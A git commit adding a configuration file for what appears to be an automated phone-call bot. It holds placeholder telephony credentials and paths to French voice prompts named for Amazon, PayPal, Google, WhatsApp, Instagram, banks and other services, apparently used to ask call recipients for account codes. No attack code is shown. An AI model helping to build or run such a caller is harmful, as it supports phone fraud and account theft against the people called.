0bf2a615d83ac9ad9e61a33e09cca79bd065456c
Miller JS Dev <166415354+millerjsdev@users.noreply.github.com>
2024-04-08 18:37:07 +0300

    Create config.js

---
+++ config/config.js
@@ -0,0 +1,24 @@
+module.exports = {
+    setupdone: 'false',
+    accountSid: '',
+    authToken: '',
+    callerid: '+yourcallerid',
+
+    apipassword: 'passwordtochange',
+    serverurl: 'http://yourserverip:777',
+    port: process.env.PORT || 777,
+
+    amazonfilepath: './voice/fr/amazon/ask-amazon.mp3',
+    cdiscountfilepath: './voice/fr/cdiscount/ask-cdiscount.mp3',
+    twitterfilepath: './voice/fr/twitter/ask-twitter.mp3',
+    whatsappfilepath: './voice/fr/whatsapp/ask-whatsapp.mp3',
+    paypalfilepath: './voice/fr/paypal/ask-pp.mp3',
+    googlefilepath: './voice/fr/google/ask-google.mp3',
+    snapchatfilepath: './voice/fr/snapchat/ask-snapchat.mp3',
+    instagramfilepath: './voice/fr/instagram/ask-instagram.mp3',
+    facebookfilepath: './voice/fr/facebook/ask-facebook.mp3',
+    endfilepath: './voice/fr/done/call-done.mp3',
+    defaultfilepath: './voice/fr/default/ask-default.mp3',
+    banquefilepath: './voice/fr/banque/ask-banque.mp3',
+    testsms: 'this is a test from miller'
+};
